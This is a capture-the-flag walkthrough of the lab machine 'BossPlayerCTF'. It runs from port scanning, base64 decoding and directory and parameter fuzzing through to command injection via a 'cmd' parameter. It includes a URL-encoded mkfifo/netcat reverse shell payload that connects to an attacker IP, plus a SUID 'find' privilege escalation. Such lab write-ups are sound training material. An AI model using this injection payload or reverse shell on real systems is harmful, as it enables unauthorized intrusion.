BossPlayerCTF

Target IP: 192.168.186.20

Scanning


There are two ports open on the target machine: SSH and HTTP on the standard port.

Enumeration

Port 80: HTTP


The webpage above is displayed.


Viewing the source-code of this webpage shows the base64 string WkRJNWVXRXliSFZhTW14MVkwaEtkbG96U214ak0wMTFZMGRvZDBOblBUMEsK as a HTML comment.


After decoding the base64 string multiple times, I got the result workinginprogress.php. Before I browse to this page, I wish to enumerate for directories.


Performing a directory search using the command gobuster dir -u http://192.168.186.20/ -w /usr/share/wordlists/dirb/big.txt -x php,html,txt, shows the result above.



The robots.txt file contains another base64 string bG9sIHRyeSBoYXJkZXIgYnJvCg==, but this was not helpful. Only page left to check out is now workinginprogress.php.


The workinprogress.php displays the webpage above. There is a possible username called haley. Not only that, under the "Outstanding" section, it mentions Test ping command. Does this page allow commands to be performed?


When testing for parameter names using the command ffuf -u http://192.168.186.20/workinginprogress.php?FUZZ=ls -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -fs 271, I obtained a parameter name called cmd.


And this target host is vulnerable to command injection attacks. Sending the payload cmd?=id;whoami;ls output the result above. Time to obtain a reverse shell connection now.

Exploitation


I obtained a reverse shell connection by sending the payload below. I now have a foothold on the machine.
Payload: rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%20192.168.45.195%208443%20%3E%2Ftmp%2Ff.
Full URL with payload: http://192.168.186.20/workinginprogress.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%20192.168.45.195%208443%20%3E%2Ftmp%2Ff.

Privilege Escalation


Running find / -perm -u=s 2>/dev/null shows /usr/bin/find has SUID bit set. I used this binary to gain a root shell.

Flags


The proof.txt and local.txt flag files.
